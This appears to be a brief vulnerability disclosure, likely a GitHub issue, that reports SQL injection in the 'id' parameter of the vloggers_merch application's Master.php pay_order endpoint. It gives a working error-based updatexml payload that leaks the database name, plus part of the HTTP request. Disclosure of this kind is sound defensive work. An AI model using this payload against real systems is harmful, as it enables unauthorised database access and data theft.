...
Vulnerability File: /vloggers_merch/classes/Master.php?f=pay_order

Vulnerability location: /vloggers_merch/classes/Master.php?f=pay_order, id

[+] Payload: id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id

```sql
POST /vloggers_merch/classes/Master.php?f=pay_order HTTP/1.1
Host: 192.168.1.19
...
![image](https://user-images.githubusercontent.com/54017627/166875408-452f4019-0f37-4e7f-aac8-5d899074f64d.png)
